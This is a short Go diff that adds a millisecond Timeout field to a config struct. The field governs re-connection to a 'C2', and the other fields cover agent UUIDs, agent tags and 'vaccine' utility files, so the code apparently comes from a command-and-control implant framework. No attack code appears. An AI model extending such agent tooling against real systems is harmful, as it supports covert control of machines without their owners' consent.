@@ -65,4 +65,5 @@ type Config struct {
 	UtilsPath            string `json:"utils_path"`             // where to store `vaccine` files
 	AgentUUID            string `json:"agent_uuid"`             // UUID of agent
 	AgentTag             string `json:"agent_tag"`              // generated from UUID, will be used to identidy agents
+	Timeout              int    `json:"timeout"`                // wait until this amount of milliseconds to re-connect to C2
 }
